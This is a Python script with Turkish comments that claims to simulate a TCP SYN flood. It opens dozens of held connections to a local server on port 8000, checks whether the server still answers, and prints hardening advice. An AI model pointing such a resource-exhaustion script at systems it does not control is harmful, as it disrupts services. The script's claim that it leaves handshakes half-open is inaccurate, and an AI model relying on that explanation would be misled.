"""
TCP SYN Flood Attack Simulation
3-way handshake'i yarıda bırakarak server'ı test eder
"""

import socket
import time
from datetime import datetime
from colorama import init, Fore, Style
import random

init()

def print_banner():
    banner = f"""
{Fore.RED}
╔═══════════════════════════════════════════════════════╗
║   🔴 TCP SYN FLOOD ATTACK SIMULATION                 ║
║   3-Way Handshake Attack Test                        ║
╠═══════════════════════════════════════════════════════╣
║  Target: localhost:8000                               ║
║  Attack: SYN packets without completing handshake    ║
║  Goal: Half-open connections (resource exhaustion)   ║
╚═══════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

def create_half_open_connection(host, port, timeout=2):
    """
    Yarım açık bağlantı oluştur
    1. SYN gönder
    2. SYN-ACK al
    3. ACK göndermeden bırak!
    """
    try:
        # Socket oluştur
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        # SYN göndereceğiz (connect_ex ile)
        start_time = time.time()
        
        # Non-blocking connect başlat (SYN gönderir)
        sock.setblocking(False)
        
        try:
            sock.connect((host, port))
        except BlockingIOError:
            # Bu normal, non-blocking mode'da beklenir
            pass
        except Exception as e:
            return {
                "status": "ERROR",
                "error": str(e),
                "time_ms": 0
            }
        
        # Kısa bekle (server SYN-ACK gönderir)
        time.sleep(0.1)
        
        elapsed = (time.time() - start_time) * 1000
        
        # Socket'i KAPATMA! Yarım bırak!
        # Bu server'da half-open connection bırakır
        
        return {
            "status": "HALF_OPEN",
            "socket": sock,  # Socket referansını tut
            "time_ms": round(elapsed, 2)
        }
        
    except socket.timeout:
        return {
            "status": "TIMEOUT",
            "time_ms": timeout * 1000
        }
    except Exception as e:
        return {
            "status": "ERROR",
            "error": str(e),
            "time_ms": 0
        }

def syn_flood_attack(target_host, target_port, num_connections=50, delay=0.05):
    """SYN Flood saldırısı gerçekleştir"""
    
    print(f"{Fore.YELLOW}[INFO] SYN Flood saldırısı başlatılıyor...{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}Target: {target_host}:{target_port}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Connections: {num_connections}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Delay: {delay}s{Style.RESET_ALL}\n")
    
    half_open_sockets = []
    results = []
    
    print(f"{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}PHASE 1: HALF-OPEN CONNECTIONS OLUŞTURULUYOR{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}\n")
    
    # Yarım açık bağlantılar oluştur
    for i in range(1, num_connections + 1):
        print(f"[{i:3d}/{num_connections}] ", end="")
        
        result = create_half_open_connection(target_host, target_port)
        
        if result["status"] == "HALF_OPEN":
            print(f"{Fore.GREEN}✅ Half-open connection oluşturuldu{Style.RESET_ALL} ", end="")
            print(f"({result['time_ms']}ms)")
            half_open_sockets.append(result["socket"])
        elif result["status"] == "TIMEOUT":
            print(f"{Fore.RED}❌ Timeout{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}❌ Error: {result.get('error', 'Unknown')}{Style.RESET_ALL}")
        
        results.append(result)
        time.sleep(delay)
    
    # Server durumunu kontrol et
    print(f"\n{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}PHASE 2: SERVER DURUMU KONTROL EDİLİYOR{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}\n")
    
    print(f"{Fore.CYAN}[INFO] {len(half_open_sockets)} adet half-open socket tutuyoruz{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[INFO] Server şu anda bu connection'ları bekliyor...{Style.RESET_ALL}\n")
    
    # Yeni bağlantı deneme (server çalışıyor mu?)
    print(f"{Fore.YELLOW}[TEST] Yeni normal bağlantı deneniyor...{Style.RESET_ALL}")
    
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(5)
        test_start = time.time()
        test_sock.connect((target_host, target_port))
        test_time = (time.time() - test_start) * 1000
        test_sock.close()
        
        print(f"{Fore.GREEN}✅ Server hala cevap veriyor ({test_time:.2f}ms){Style.RESET_ALL}")
        print(f"{Fore.GREEN}   Server DoS'a dirençli!{Style.RESET_ALL}\n")
        
    except socket.timeout:
        print(f"{Fore.RED}❌ Server TIMEOUT! Server yanıt vermiyor!{Style.RESET_ALL}")
        print(f"{Fore.RED}🚨 DoS saldırısı BAŞARILI - Server kaynaklarını tüketti{Style.RESET_ALL}\n")
    except Exception as e:
        print(f"{Fore.RED}❌ Bağlantı hatası: {e}{Style.RESET_ALL}\n")
    
    # Bekleme süresi
    wait_time = 10
    print(f"{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}PHASE 3: {wait_time} SANİYE BEKLEME (Server kaynak tüketiyor){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}\n")
    
    for i in range(wait_time):
        print(f"{Fore.CYAN}[{i+1}/{wait_time}] Bekleniyor... " 
              f"({len(half_open_sockets)} half-open connection aktif){Style.RESET_ALL}")
        time.sleep(1)
    
    # Temizlik
    print(f"\n{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}PHASE 4: CLEANUP - Bağlantılar kapatılıyor{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}\n")
    
    for i, sock in enumerate(half_open_sockets, 1):
        try:
            sock.close()
            if i % 10 == 0:
                print(f"{Fore.GREEN}[{i}/{len(half_open_sockets)}] Socket'ler kapatılıyor...{Style.RESET_ALL}")
        except:
            pass
    
    print(f"{Fore.GREEN}✅ Tüm socket'ler kapatıldı{Style.RESET_ALL}\n")
    
    # Sonuçlar
    print(f"{Fore.GREEN}{'═' * 70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}SONUÇLAR{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{'═' * 70}{Style.RESET_ALL}\n")
    
    successful = sum(1 for r in results if r["status"] == "HALF_OPEN")
    failed = len(results) - successful
    
    print(f"📊 Toplam Deneme: {len(results)}")
    print(f"✅ Başarılı Half-Open: {successful}")
    print(f"❌ Başarısız: {failed}")
    print(f"📈 Başarı Oranı: {(successful/len(results))*100:.1f}%\n")
    
    # Server connection limit testi
    print(f"{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}SERVER KAPASITE ANALİZİ{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'─' * 70}{Style.RESET_ALL}\n")
    
    if successful > 40:  # %80'den fazla başarılı
        print(f"{Fore.RED}🔴 VULNERABLE: Server connection limit yok!{Style.RESET_ALL}")
        print(f"{Fore.RED}   {successful} adet half-open connection kabul edildi{Style.RESET_ALL}")
        print(f"{Fore.RED}   Saldırgan DoS yapabilir{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}ÖNERİLEN DÜZELTME:{Style.RESET_ALL}")
        print(f"  1. Connection limit ekle (max 100-200)")
        print(f"  2. SYN cookies kullan")
        print(f"  3. Connection timeout düşür (30s → 5s)")
        print(f"  4. Rate limiting ekle (IP başına limit)")
        print(f"  5. Firewall kuralları ekle")
    else:
        print(f"{Fore.GREEN}✅ SAFE: Server connection limit çalışıyor{Style.RESET_ALL}")
    
    # Server kaynak kullanımı
    print(f"\n{Fore.CYAN}SERVER KAYNAK KULLANIMI (TAHMİNİ):{Style.RESET_ALL}")
    print(f"  Memory: ~{successful * 4}KB (her connection ~4KB)")
    print(f"  File Descriptors: {successful} adet")
    print(f"  Network Buffers: ~{successful * 16}KB")
    
    return results

def quick_connection_test(host, port):
    """Hızlı bağlantı testi - server cevap veriyor mu?"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        start = time.time()
        sock.connect((host, port))
        elapsed = (time.time() - start) * 1000
        sock.close()
        return True, elapsed
    except:
        return False, 0

if __name__ == "__main__":
    print_banner()
    
    print(f"{Fore.YELLOW}⚠️  UYARI: Bu bir DoS saldırı simülasyonudur!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}   Sadece kendi sistemlerinizde kullanın!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}   Başkalarının sistemlerine saldırmak SUÇtur!{Style.RESET_ALL}\n")
    
    # Önce server'ın çalıştığını doğrula
    print(f"{Fore.CYAN}[PRE-CHECK] Server durumu kontrol ediliyor...{Style.RESET_ALL}")
    is_alive, response_time = quick_connection_test("localhost", 8000)
    
    if is_alive:
        print(f"{Fore.GREEN}✅ Server aktif ({response_time:.2f}ms){Style.RESET_ALL}\n")
    else:
        print(f"{Fore.RED}❌ Server'a bağlanılamadı!{Style.RESET_ALL}")
        print(f"{Fore.RED}   Backend çalıştığından emin olun (localhost:8000){Style.RESET_ALL}\n")
        exit(1)
    
    input(f"{Fore.CYAN}Devam etmek için Enter'a basın...{Style.RESET_ALL}\n")
    
    # Saldırıyı başlat
    results = syn_flood_attack(
        target_host="localhost",
        target_port=8000,
        num_connections=50,  # 50 half-open connection
        delay=0.05  # Her connection arası 50ms
    )
    
    print(f"\n{Fore.GREEN}✅ Test tamamlandı!{Style.RESET_ALL}\n")
    
    # JSON rapor
    import json
    report = {
        "test_date": datetime.now().isoformat(),
        "target": "localhost:8000",
        "attack_type": "SYN_FLOOD",
        "total_attempts": len(results),
        "successful_half_open": sum(1 for r in results if r["status"] == "HALF_OPEN"),
        "results": [{"status": r["status"], "time_ms": r.get("time_ms", 0)} for r in results]
    }
    
    with open('syn_flood_test_results.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"📄 Detaylı rapor: syn_flood_test_results.json\n")
